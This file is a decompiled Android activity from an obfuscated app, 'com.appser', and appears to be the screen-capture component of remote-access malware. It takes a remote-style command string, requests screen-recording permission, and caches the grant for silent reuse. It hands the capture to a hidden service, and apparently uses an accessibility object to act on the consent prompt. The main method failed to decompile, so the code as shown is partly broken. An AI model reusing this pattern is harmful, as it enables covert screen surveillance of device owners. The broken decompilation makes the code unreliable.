package com.appser;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;

public class SCRActivity extends Activity {
    private static final int REQUEST_SCREENSHOT = 59706;
    private static Intent staticIntentData;
    private static int staticResultCode;
    private int F = 10;
    private String Perantid;
    private int Qualti = 10;
    private MediaProjectionManager mgr;

    public void finish() {
        if (Build.VERSION.SDK_INT >= 21) {
            super.finishAndRemoveTask();
        } else {
            super.finish();
        }
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        super.onDestroy();
    }

    /* access modifiers changed from: protected */
    /* JADX WARNING: Exception block dominator not found, dom blocks: [] */
    /* JADX WARNING: Missing exception handler attribute for start block: B:23:0x00c5 */
    /* JADX WARNING: Missing exception handler attribute for start block: B:29:0x00f7 */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x00f2 A[Catch:{ Exception -> 0x00f7 }] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void onCreate(android.os.Bundle r12) {
        /*
            r11 = this;
            java.lang.String r0 = "on:"
            super.onCreate(r12)
            r12 = 1
            java.lang.Boolean r1 = java.lang.Boolean.valueOf(r12)
            r11.requestWindowFeature(r12)
            android.view.Window r2 = r11.getWindow()
            r3 = 1024(0x400, float:1.435E-42)
            r2.setFlags(r3, r3)
            android.content.Intent r2 = r11.getIntent()     // Catch:{ Exception -> 0x010f }
            r3 = 0
            java.lang.String r4 = "key"
            java.lang.String r3 = r2.getStringExtra(r4)     // Catch:{ Exception -> 0x0022 }
            goto L_0x0023
        L_0x0022:
        L_0x0023:
            if (r3 != 0) goto L_0x0027
            java.lang.String r3 = "off"
        L_0x0027:
            boolean r2 = r3.startsWith(r0)     // Catch:{ Exception -> 0x010f }
            if (r2 == 0) goto L_0x00fb
            android.content.Intent r2 = staticIntentData     // Catch:{ Exception -> 0x010f }
            r4 = 59706(0xe93a, float:8.3666E-41)
            java.lang.String r5 = "media_projection"
            java.lang.String r6 = "~"
            java.lang.String r7 = ""
            r8 = 0
            if (r2 != 0) goto L_0x0074
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_SC = r1     // Catch:{ Exception -> 0x010f }
            java.lang.String r0 = r3.replace(r0, r7)     // Catch:{ Exception -> 0x010f }
            java.lang.String[] r0 = r0.split(r6)     // Catch:{ Exception -> 0x010f }
            r1 = r0[r8]     // Catch:{ Exception -> 0x010f }
            int r1 = java.lang.Integer.parseInt(r1)     // Catch:{ Exception -> 0x010f }
            r11.Qualti = r1     // Catch:{ Exception -> 0x010f }
            r12 = r0[r12]     // Catch:{ Exception -> 0x010f }
            int r12 = java.lang.Integer.parseInt(r12)     // Catch:{ Exception -> 0x010f }
            r11.F = r12     // Catch:{ Exception -> 0x010f }
            r12 = 2
            r12 = r0[r12]     // Catch:{ Exception -> 0x010f }
            r11.Perantid = r12     // Catch:{ Exception -> 0x010f }
            java.lang.Object r12 = r11.getSystemService(r5)     // Catch:{ Exception -> 0x010f }
            android.media.projection.MediaProjectionManager r12 = (android.media.projection.MediaProjectionManager) r12     // Catch:{ Exception -> 0x010f }
            r11.mgr = r12     // Catch:{ Exception -> 0x010f }
            android.content.Intent r12 = r12.createScreenCaptureIntent()     // Catch:{ Exception -> 0x010f }
            r11.startActivityForResult(r12, r4)     // Catch:{ Exception -> 0x010f }
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32 r12 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.MyAccess     // Catch:{ Exception -> 0x0112 }
            if (r12 == 0) goto L_0x0112
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32 r12 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.MyAccess     // Catch:{ Exception -> 0x0112 }
            r12.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32Treger()     // Catch:{ Exception -> 0x0112 }
            goto L_0x0112
        L_0x0074:
            java.lang.Boolean r2 = java.lang.Boolean.valueOf(r8)     // Catch:{ Exception -> 0x00c5 }
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_SC = r2     // Catch:{ Exception -> 0x00c5 }
            java.lang.String r3 = r3.replace(r0, r7)     // Catch:{ Exception -> 0x00c5 }
            java.lang.String[] r2 = r3.split(r6)     // Catch:{ Exception -> 0x00c5 }
            r9 = r2[r8]     // Catch:{ Exception -> 0x00c5 }
            int r9 = java.lang.Integer.parseInt(r9)     // Catch:{ Exception -> 0x00c5 }
            r11.Qualti = r9     // Catch:{ Exception -> 0x00c5 }
            r2 = r2[r12]     // Catch:{ Exception -> 0x00c5 }
            int r2 = java.lang.Integer.parseInt(r2)     // Catch:{ Exception -> 0x00c5 }
            r11.F = r2     // Catch:{ Exception -> 0x00c5 }
            android.content.Intent r2 = new android.content.Intent     // Catch:{ Exception -> 0x00c5 }
            java.lang.Class<com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22> r9 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.class
            r2.<init>(r11, r9)     // Catch:{ Exception -> 0x00c5 }
            java.lang.String r9 = "resultCode"
            int r10 = staticResultCode     // Catch:{ Exception -> 0x00c5 }
            android.content.Intent r2 = r2.putExtra(r9, r10)     // Catch:{ Exception -> 0x00c5 }
            java.lang.String r9 = "resultIntent"
            android.content.Intent r10 = staticIntentData     // Catch:{ Exception -> 0x00c5 }
            android.content.Intent r2 = r2.putExtra(r9, r10)     // Catch:{ Exception -> 0x00c5 }
            java.lang.String r9 = "Q"
            int r10 = r11.Qualti     // Catch:{ Exception -> 0x00c5 }
            android.content.Intent r2 = r2.putExtra(r9, r10)     // Catch:{ Exception -> 0x00c5 }
            java.lang.String r9 = "P"
            java.lang.String r10 = r11.Perantid     // Catch:{ Exception -> 0x00c5 }
            android.content.Intent r2 = r2.putExtra(r9, r10)     // Catch:{ Exception -> 0x00c5 }
            java.lang.String r9 = "F"
            int r10 = r11.F     // Catch:{ Exception -> 0x00c5 }
            android.content.Intent r2 = r2.putExtra(r9, r10)     // Catch:{ Exception -> 0x00c5 }
            r11.startService(r2)     // Catch:{ Exception -> 0x00c5 }
            goto L_0x00f7
        L_0x00c5:
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_SC = r1     // Catch:{ Exception -> 0x010f }
            java.lang.String r0 = r3.replace(r0, r7)     // Catch:{ Exception -> 0x010f }
            java.lang.String[] r0 = r0.split(r6)     // Catch:{ Exception -> 0x010f }
            r1 = r0[r8]     // Catch:{ Exception -> 0x010f }
            int r1 = java.lang.Integer.parseInt(r1)     // Catch:{ Exception -> 0x010f }
            r11.Qualti = r1     // Catch:{ Exception -> 0x010f }
            r12 = r0[r12]     // Catch:{ Exception -> 0x010f }
            int r12 = java.lang.Integer.parseInt(r12)     // Catch:{ Exception -> 0x010f }
            r11.F = r12     // Catch:{ Exception -> 0x010f }
            java.lang.Object r12 = r11.getSystemService(r5)     // Catch:{ Exception -> 0x010f }
            android.media.projection.MediaProjectionManager r12 = (android.media.projection.MediaProjectionManager) r12     // Catch:{ Exception -> 0x010f }
            r11.mgr = r12     // Catch:{ Exception -> 0x010f }
            android.content.Intent r12 = r12.createScreenCaptureIntent()     // Catch:{ Exception -> 0x010f }
            r11.startActivityForResult(r12, r4)     // Catch:{ Exception -> 0x010f }
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32 r12 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.MyAccess     // Catch:{ Exception -> 0x00f7 }
            if (r12 == 0) goto L_0x00f7
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32 r12 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.MyAccess     // Catch:{ Exception -> 0x00f7 }
            r12.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32Treger()     // Catch:{ Exception -> 0x00f7 }
        L_0x00f7:
            r11.finish()     // Catch:{ Exception -> 0x010f }
            goto L_0x0112
        L_0x00fb:
            android.content.Intent r12 = new android.content.Intent     // Catch:{ Exception -> 0x010f }
            java.lang.Class<com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22> r0 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.class
            r12.<init>(r11, r0)     // Catch:{ Exception -> 0x010f }
            java.lang.String r0 = "com.appser.verapq.SHUTDOWN"
            android.content.Intent r12 = r12.setAction(r0)     // Catch:{ Exception -> 0x010f }
            r11.startService(r12)     // Catch:{ Exception -> 0x010f }
            r11.finish()     // Catch:{ Exception -> 0x010f }
            goto L_0x0112
        L_0x010f:
            r11.finish()
        L_0x0112:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.appser.SCRActivity.onCreate(android.os.Bundle):void");
    }

    /* access modifiers changed from: protected */
    public void onActivityResult(int i, int i2, Intent intent) {
        if (i == REQUEST_SCREENSHOT && i2 == -1) {
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_SC = false;
            staticIntentData = intent;
            staticResultCode = i2;
            startService(new Intent(this, gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.class).putExtra("resultCode", i2).putExtra("resultIntent", intent).putExtra("Q", this.Qualti).putExtra("P", this.Perantid).putExtra("F", this.F));
        }
        finish();
    }
}
